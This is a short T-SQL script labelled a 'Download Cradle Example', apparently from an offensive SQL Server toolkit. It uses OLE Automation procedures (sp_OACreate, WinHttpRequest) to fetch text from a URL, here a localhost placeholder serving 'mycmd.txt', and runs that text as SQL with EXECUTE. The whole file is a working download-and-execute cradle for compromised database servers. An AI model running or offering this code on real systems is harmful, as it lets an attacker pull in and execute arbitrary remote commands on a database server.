-- OLE Automation Procedure - Download Cradle Example
-- Does not require a table, but can't handle larger payloads

-- Setup Variables
DECLARE @url varchar(300)   
DECLARE @WinHTTP int  
DECLARE @handle  int  
DECLARE @Command varchar(8000) 

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Setup namespace
EXEC @handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT  

-- Call the Open method to setup the HTTP request
EXEC @handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false' 

-- Call the Send method to send the HTTP GET request
EXEC @handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content
EXEC @handle=sp_OAGetProperty @WinHTTP,'ResponseText', @Command out

-- Destroy the object
EXEC @handle=sp_OADestroy @WinHTTP  

-- Display command
SELECT @Command

-- Run command
EXECUTE (@Command) 
